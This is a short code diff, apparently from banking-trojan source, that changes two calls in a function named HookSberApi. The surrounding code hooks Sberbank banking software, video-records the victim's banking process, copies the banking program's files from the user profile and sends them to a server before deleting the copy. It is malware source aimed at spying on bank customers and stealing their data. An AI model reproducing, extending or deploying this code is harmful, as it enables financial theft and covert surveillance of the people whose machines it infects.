@@ -315,7 +315,7 @@ static bool HookSberApi()
 	DBG( "Sber", "Установка хуков выполнена" );
 	SendLogToAdmin(3);
 
-	StartRecordThread( GetUniquePID(), "Sber", NULL, NULL, 700 );
+	VideoRecorder::RecordProcess(0, "Sber");
 
 	char path[MAX_PATH];
 	pExpandEnvironmentStringsA( "%USERPROFILE%", path, sizeof(path) );
@@ -365,7 +365,7 @@ static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 			if( CopyFileANdFolder( folderPrg, folderTmp ) )
 			{
 				DBG( "SBER", "Копирование на сервер" );
-				VideoRecorderSendPath( folderTmp, 0 /*"192.168.0.100"*/, NULL, 700 );
+				VideoRecorder::SendFiles(folderTmp);
 				DeleteFolders(folderTmp);
 			}
 			flag = 1;
